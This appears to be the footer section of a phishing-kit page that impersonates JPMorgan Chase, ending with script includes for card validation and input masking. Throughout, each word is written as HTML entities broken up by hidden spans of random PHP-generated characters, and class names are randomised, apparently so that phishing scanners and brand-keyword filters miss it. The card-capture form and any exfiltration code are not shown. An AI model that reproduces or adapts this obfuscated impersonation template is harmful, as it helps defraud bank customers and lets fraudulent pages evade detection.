                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#84;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;&colon;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#74;&period;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;&period;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#74;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&amp;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;&period;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;&ntilde;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;</a></span></li>
                                    <li>Member FDIC</li>
                                    <li><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui equal-housing-lender icon touch"></i><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#113;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#72;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;</li>
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> copyright-label">&copy;
                                        <script>
                                            document.write(new Date().getFullYear())
                                        </script><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#74;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&amp; Co.</li>
                                </ul>
                            </div>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row galaxy-footer">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> NOTE"><span></span>
                                    <br> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> copyright-label">&copy;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<script> document.write(new Date().getFullYear()) </script><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#74;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&amp;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;&period;</span></p>
                                <p><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor NOTELINK touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui progressright icon end-icon"  ></i></a></span></p>
                                <p><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor NOTELINK touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui progressright icon end-icon" ></i></a></span></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
    <script src="./js/jquery.CardValidator.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script src="./js/MyBabyTwo.js"></script>
</body>

</html>